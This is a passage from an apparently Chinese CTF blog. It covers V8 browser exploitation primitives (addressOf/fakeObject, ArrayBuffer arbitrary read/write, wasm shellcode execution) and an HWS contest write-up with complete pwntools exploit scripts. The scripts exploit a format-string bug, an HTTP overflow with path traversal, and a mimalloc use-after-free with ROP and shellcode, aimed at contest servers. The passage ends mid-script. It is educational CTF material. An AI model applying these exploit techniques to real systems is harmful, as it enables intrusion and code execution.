<span class="hljs-attr">name:</span> <span class="hljs-string">depot_tools</span><br>      <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">        git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="hljs-string">        echo export PATH=\&quot;\$PATH:`pwd`/depot_tools/\&quot; &gt;&gt; ~/.bash_profile</span><br><span class="hljs-string"></span>    <br>    <span class="hljs-comment"># fetch v8 source code</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">fetch</span> <span class="hljs-string">v8</span><br>      <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">        source ~/.bash_profile</span><br><span class="hljs-string">        fetch v8</span><br><span class="hljs-string"></span>    <br>    <span class="hljs-comment"># patch source code</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">patch</span> <span class="hljs-string">v8</span><br>      <span class="hljs-attr">if:</span> <span class="hljs-string">env.PATCH_FLAG</span> <span class="hljs-string">==</span> <span class="hljs-string">&#x27;true&#x27;</span> <span class="hljs-string">&amp;&amp;</span> <span class="hljs-type">!cancelled()</span><br>      <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">        cd v8</span><br><span class="hljs-string">        git reset --hard $COMMIT</span><br><span class="hljs-string">        cd ..</span><br><span class="hljs-string"></span>        <br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">build</span> <span class="hljs-string">v8</span><br>      <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">        source ~/.bash_profile</span><br><span class="hljs-string">        cd v8</span><br><span class="hljs-string">        gclient sync -f</span><br><span class="hljs-string">        ./tools/dev/v8gen.py x64.release</span><br><span class="hljs-string">        ninja -C out.gn/x64.release</span><br><span class="hljs-string">        ./tools/dev/v8gen.py x64.debug</span><br><span class="hljs-string">        ninja -C out.gn/x64.debug</span><br><span class="hljs-string">        cd ..</span><br><span class="hljs-string"></span>        <br>    <span class="hljs-comment"># zip d8</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">7zip</span> <span class="hljs-string">v8_src</span><br>      <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">        mkdir d8</span><br><span class="hljs-string">        cp -R v8/out.gn d8</span><br><span class="hljs-string">        cp -R v8/src d8</span><br><span class="hljs-string">        cp -R v8/tools d8</span><br><span class="hljs-string">        zip -q -r v8.zip d8</span><br><span class="hljs-string"></span>    <br>    <span class="hljs-comment"># upload v8.zip</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">upload</span> <span class="hljs-string">v8_src</span><br>      <span class="hljs-attr">if:</span> <span class="hljs-string">env.DEPOT_UPLOAD</span> <span class="hljs-string">==</span> <span class="hljs-string">&#x27;true&#x27;</span> <span class="hljs-string">&amp;&amp;</span> <span class="hljs-type">!cancelled()</span><br>      <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">        wget https://github.com/Mikubill/transfer/releases/download/v0.4.17/transfer_0.4.17_linux_amd64.tar.gz</span><br><span class="hljs-string">        tar -xzvf  transfer_0.4.17_linux_amd64.tar.gz</span><br><span class="hljs-string">        ./transfer wss --block 2621440 -s -p 64 --no-progress v8.zip 2&gt;&amp;1 | tee cowtransfer.log</span><br><span class="hljs-string">        echo &quot;::warning file=wenshushu.cn::$(cat cowtransfer.log | grep https)&quot;</span><br></code></pre></td></tr></table></figure><p>​                                                               </p><h3 id="V8源码分析"><a href="#V8源码分析" class="headerlink" title="V8源码分析"></a>V8源码分析</h3><p>本人很菜，现在只能对builtins-array.cc中常见的函数进行一些总结。</p><p>builtins-array.cc是JavaScript 数组操作相关的内置函数的实现。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">// 获取传入参数个数</span><br>uint32_t len = args.length<span class="hljs-literal">()</span>;<br><br><span class="hljs-comment">// 获取数组的当前长度，并将其转换为 uint32_t 类型。</span><br>uint32_t len = static_cast&lt;uint32_t&gt;(<span class="hljs-built_in">array</span>-&gt;length<span class="hljs-literal">()</span>.<span class="hljs-constructor">Number()</span>);<br><br><span class="hljs-comment">// 将args的第二个参数转换为数字类型，并将结果存储在 result 中。</span><br><span class="hljs-constructor">ASSIGN_RETURN_FAILURE_ON_EXCEPTION(<span class="hljs-params">isolate</span>, <span class="hljs-params">result</span>, Object::ToNumber(<span class="hljs-params">isolate</span>, <span class="hljs-params">args</span>.<span class="hljs-params">at</span>&lt;Object&gt;(1)</span>));<br><br><span class="hljs-comment">// 将数组中的特定索引位置的元素设置为经过转换的数字值</span><br>elements.set(idx, value-&gt;<span class="hljs-constructor">Number()</span>);<br><br><span class="hljs-comment">//从 elements中获取length的索引位置的元素</span><br>*(isolate-&gt;factory<span class="hljs-literal">()</span>-&gt;<span class="hljs-constructor">NewNumber(<span class="hljs-params">elements</span>.<span class="hljs-params">get_scalar</span>(<span class="hljs-params">length</span>)</span>))<br></code></pre></td></tr></table></figure><p>具体题目：<a href="https://www.freebuf.com/vuls/203721.html">starctf2019-oob</a>、<a href="https://xz.aliyun.com/t/6577">数字经济-final-browser</a></p><p>​                                         </p><h3 id="V8漏洞利用"><a href="#V8漏洞利用" class="headerlink" title="V8漏洞利用"></a>V8漏洞利用</h3><h4 id="addressOf和fakeObject"><a href="#addressOf和fakeObject" class="headerlink" title="addressOf和fakeObject"></a>addressOf和fakeObject</h4><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">var</span> obj = &#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">1</span>&#125;;<br><span class="hljs-keyword">var</span> obj_array = [obj];<br><span class="hljs-keyword">var</span> float_array = [<span class="hljs-number">1.1</span>];<br></code></pre></td></tr></table></figure><p>obj_array数组中存储的是obj的地址，float_array数组中存储的是浮点数，v8完全依赖map类型对js对象进行解析。如果可以修改obj_array的map为float_array的map，再去使用obj_array[0]是去按浮点数去取值，原来的值是obj的地址，最后以浮点数的形式泄漏地址；同样如果可以修改float_array的map为obj_array的map，再去使用float_array[0]是去按对象地址去取值，原来的值是浮点数，最后以16进制的IEEE754数为地址得到一个对象，当然这个地址与地址中的内容需要提前构造好。</p><h4 id="利用ArrayBuffer去任意读写"><a href="#利用ArrayBuffer去任意读写" class="headerlink" title="利用ArrayBuffer去任意读写"></a>利用ArrayBuffer去任意读写</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">var data_buf = new ArrayBuffer(<span class="hljs-number">48</span>)<span class="hljs-comment">;</span><br>%DebugPrint(obj)<span class="hljs-comment">;</span><br>%SystemBreak()<span class="hljs-comment">;</span><br>pwndbg&gt; tele <span class="hljs-number">0x7d9b1b8e748</span><br><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>│  <span class="hljs-number">0x7d9b1b8e748</span> —▸ <span class="hljs-number">0x1c5bac984371</span> ◂— <span class="hljs-number">0x80000055d5b5822</span>  (map)<br><span class="hljs-number">01</span>:<span class="hljs-number">0008</span>│  <span class="hljs-number">0x7d9b1b8e750</span> —▸ <span class="hljs-number">0x55d5b582cf1</span> ◂— <span class="hljs-number">0x55d5b5828</span> <br><span class="hljs-number">02</span>:<span class="hljs-number">0010</span>│  <span class="hljs-number">0x7d9b1b8e758</span> —▸ <span class="hljs-number">0x55d5b582cf1</span> ◂— <span class="hljs-number">0x55d5b5828</span><br><span class="hljs-number">03</span>:<span class="hljs-number">0018</span>│  <span class="hljs-number">0x7d9b1b8e760</span> ◂— <span class="hljs-number">0x30</span> /* <span class="hljs-string">&#x27;0&#x27;</span> */  (byte_length)<br><span class="hljs-number">04</span>:<span class="hljs-number">0020</span>│  <span class="hljs-number">0x7d9b1b8e768</span> —▸ <span class="hljs-number">0x55e3856e4f90</span> ◂— <span class="hljs-number">0x0</span> (backing_store)<br></code></pre></td></tr></table></figure><p>BackingStore地址是申请堆上的一段内存，是真正写入数据的地址，如果修改BackingStore指针，那么就可以获得任意读写的能力了。</p><p>当然要想任意读写的前提是先泄漏一个合法的地址，再修改BackingStore指针，如果V8使用了指针压缩，将指针的有效位数减少到32位或更少，虽然对BackingStore指针没有影响，但是前面提到的obj_array中存的会是一个32位地址（将高32直接去掉，只保留低32位），这样无法泄漏完整的地址。</p><h4 id="伪造map"><a href="#伪造map" class="headerlink" title="伪造map"></a>伪造map</h4><p>有时如果没法泄漏map地址，是可以直接伪造map</p><p>具体题目：<a href="https://eternalsakura13.com/2019/04/29/v9/">34c3 v9</a></p><h4 id="wasm执行shellcode"><a href="#wasm执行shellcode" class="headerlink" title="wasm执行shellcode"></a>wasm执行shellcode</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">var</span> wasmCode = new Uint8Array([<span class="hljs-number">0</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">109</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">133</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">96</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<br>    <span class="hljs-attribute">127</span>,<span class="hljs-number">3</span>,<span class="hljs-number">130</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">112</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">131</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<br>    <span class="hljs-attribute">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">129</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-number">145</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">109</span>,<span class="hljs-number">101</span>,<span class="hljs-number">109</span>,<span class="hljs-number">111</span>,<span class="hljs-number">114</span>,<span class="hljs-number">121</span>,<span class="hljs-number">2</span>,<br>    <span class="hljs-attribute">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">109</span>,<span class="hljs-number">97</span>,<span class="hljs-number">105</span>,<span class="hljs-number">110</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">10</span>,<span class="hljs-number">138</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">65</span>,<span class="hljs-number">42</span>,<span class="hljs-number">11</span>]);<br><span class="hljs-attribute">var</span> wasmModule = new WebAssembly.Module(wasmCode);<br><span class="hljs-attribute">var</span> wasmInstance = new WebAssembly.Instance(wasmModule, &#123;&#125;);<br><span class="hljs-attribute">var</span> f = wasmInstance.exports.main;<br></code></pre></td></tr></table></figure><p>结合其它漏洞将原本内存中的的wasm代码替换为shellcode，当后续调用f函数时，实际上调用的就是shellcode。</p><p>先得到f函数的地址，通过shared_info–&gt;WasmExportedFunctionData–&gt;Instance这一系列关系，最后在Instance的固定偏移处（不同V8版本偏移是不同的），就能读取到存储wasm代码的内存页起始地址，这个内存页是RWX段并且是页对齐的。如果直接可以得到wasmInstance的地址就不用上述麻烦办法，其实Instance的地址就是wasmInstance的地址。</p><p>对于一些低版本的V8，RWX段是可以直接在f函数的地址的偏移处找到的（具体题目：<a href="https://eternalsakura13.com/2019/04/29/v9/">34c3 v9</a>）</p><img src="/img/17/Screenshot 2023-09-11 155203.png" style="zoom:50%;" /><p>​                      </p><p>也有shared_info中没有WasmExportedFunctionData的这种情况（还不清楚是什么原因，具体题目：<a href="https://xz.aliyun.com/t/5190">PlaidCTF roll a d8</a>）</p><img src="/img/17/Screenshot 2023-09-11 160507.png" style="zoom:50%;" />]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>HWS-PWN</title>
    <link href="/2023/07/17/HWS-PWN/"/>
    <url>/2023/07/17/HWS-PWN/</url>
    
    <content type="html"><![CDATA[<p>这次有幸能将三道pwn题都解出了，第一天上大分，但只会解pwn，第二天不断掉分😢。</p><h2 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h2><p>白给的两次格式化字符串漏洞，最后改__libc_start_main为one_ganget即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;fmt&#x27;</span>)<br>libc = elf.libc<br><span class="hljs-comment">#p = process(&#x27;./fmt&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;123.60.179.52&#x27;</span>,<span class="hljs-number">30050</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>payload = <span class="hljs-string">b&#x27;%18$p,%21$p&#x27;</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>stack = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">243</span> - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>one_gadget = libc_base + <span class="hljs-number">0xe3b01</span><br>fmt_payload = fmtstr_payload(<span class="hljs-number">6</span>, &#123;(stack + <span class="hljs-number">8</span>) : one_gadget &amp; <span class="hljs-number">0xffffff</span>&#125;,  write_size=<span class="hljs-string">&#x27;byte&#x27;</span>)<br>payload = fmt_payload[:<span class="hljs-number">7</span>] + <span class="hljs-string">b&#x27;hh&#x27;</span> + fmt_payload[<span class="hljs-number">9</span>:]<br><span class="hljs-comment"># print(fmt_payload)</span><br><span class="hljs-comment"># print(payload)</span><br><span class="hljs-comment"># print(hex(one_gadget))</span><br><span class="hljs-comment"># gdb.attach(p)</span><br><span class="hljs-comment"># pause()</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>​                                               </p><h2 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h2><p>虽然限制了<code>..</code> 符号的使用，但是在sub_1766函数中有个转base64的操作，大小没有限制，可以直接溢出到haystack，再利用<code>?</code> 去绕过文件后缀名的检测，最后利用sub_2993函数中的execl去执行<code>/bin/sh</code></p><img src="/img/16/Screenshot 2023-07-16 122048.png" style="zoom:80%;" /><p>​                              </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-comment">#p = remote(&#x27;127.0.0.1&#x27;, 4000)</span><br>p = remote(<span class="hljs-string">&#x27;123.60.179.52&#x27;</span>,<span class="hljs-number">30092</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>payload = <span class="hljs-string">b&#x27;GET / HTTP/1.1\r\n&#x27;</span><br>msg = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x40</span> + <span class="hljs-string">b&#x27;/../../../bin/sh?faker.js&#x27;</span><br>payload += <span class="hljs-string">b&#x27;Authorization: Basic &#x27;</span> + base64.b64encode(msg) + <span class="hljs-string">b&#x27;\r\n\r\n&#x27;</span><br>pause()<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;\r\n&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\r\n&#x27;</span>)<br>pause()<br>p.interactive()<br></code></pre></td></tr></table></figure><p>​                                                         </p><h2 id="mi"><a href="#mi" class="headerlink" title="mi"></a>mi</h2><p>白给的uaf，主要是mimalloc的问题，随便试了一下，堆分配是将一块连续的内存（0x10000）划分为相同的大小的chunk，有点像slab。</p><p>与glibc不同，同一大小的堆块分配chunk的链表和释放chunk的链表是不同的，只有当分配chunk的链表中的chunk用尽了，才去使用释放chunk的链表（语言表述可能有点问题，如果没有get到我说的点，就多调试一下吧）。</p><img src="/img/16/Screenshot 2023-07-16 125025.png" style="zoom:80%;" /><p>先泄漏堆地址，在堆基址+0x240处有libmimalloc.so.2的地址，偏移与glibc固定，泄漏后改IO_2_1_stdout，利用house of cat去栈迁移。</p><p>libmimalloc.so.2和glibc的偏移本地和远程不一样，还要去爆破这个偏移。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;pwn&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./pwn&#x27;)</span><br><span class="hljs-keyword">global</span> p<br><span class="hljs-comment">#p = remote(&#x27;60.204.140.184&#x27;,30175)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    add(<span class="hljs-number">0x300</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        add(<span class="hljs-number">0x310</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>        delete(i)<br><br>    show(<span class="hljs-number">4</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    heap_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x30780</span><br><br>    add(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    delete(<span class="hljs-number">5</span>)<br>    edit(<span class="hljs-number">4</span>, p64(heap_addr + <span class="hljs-number">0x2c0</span>))<br>    add(<span class="hljs-number">0x310</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    add(<span class="hljs-number">0x310</span>, p64(heap_addr + <span class="hljs-number">0x240</span>))<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;0&#x27;</span>)<br>    show(<span class="hljs-number">7</span>)<br>    leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    <span class="hljs-comment">#libcbase = leak - 0x22820 - 0x1f4000</span><br>    <span class="hljs-comment">#libcbase = leak - 0x228820 - i * 0x20</span><br>    libcbase = leak - <span class="hljs-number">0x22820</span> - <span class="hljs-number">0x1f4000</span> + <span class="hljs-number">2</span> * <span class="hljs-number">0x1000</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap_addr))<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        add(<span class="hljs-number">0x400</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        delete(i + <span class="hljs-number">9</span>)<br><br><br>    IO_2_1_stdout = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>    IO_wfile_jumps = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>    pop_rdi_ret = libcbase + <span class="hljs-number">0x23b6a</span><br>    pop_rsi_ret = libcbase + <span class="hljs-number">0x2601f</span><br>    pop_rdx_ret = libcbase + <span class="hljs-number">0x142c92</span><br>    magic_gadget = libcbase + <span class="hljs-number">0x151990</span><br>    <span class="hljs-comment">#fake_addr = IO_2_1_stdout</span><br><br>    faker_addr = heap_addr + <span class="hljs-number">0x50c80</span><br>    payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">61</span>)<br>    payload = payload.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) <br>    payload += p64(faker_addr + <span class="hljs-number">0x100</span>) + p64(pop_rdi_ret + <span class="hljs-number">1</span>)<br>    payload = payload.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>    payload += flat(<br>        pop_rdi_ret, ((faker_addr + <span class="hljs-number">0x100</span>) &gt;&gt; <span class="hljs-number">12</span>) &lt;&lt; <span class="hljs-number">12</span>,<br>        pop_rsi_ret, <span class="hljs-number">0x2000</span>,<br>        pop_rdx_ret, <span class="hljs-number">7</span>,<br>        libcbase + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>],<br>        faker_addr + <span class="hljs-number">0x140</span><br>    )<br>    payload += asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>))<br><br>    edit(<span class="hljs-number">12</span>, p64(IO_2_1_stdout))<br>    add(<span class="hljs-number">0x400</span>, payload)<br><br>    fake_IO_FILE = p64(<span class="hljs-number">0</span>) + p64(heap_addr + <span class="hljs-number">0x50c80</span>)<br>    fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span><br>    fake_IO_FILE += p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>)<br>    fake_IO_FILE += p64(heap_addr)<br>    fake_IO_FILE += p64(magic_gadget)<br>    fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>    fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x88</span>, <span 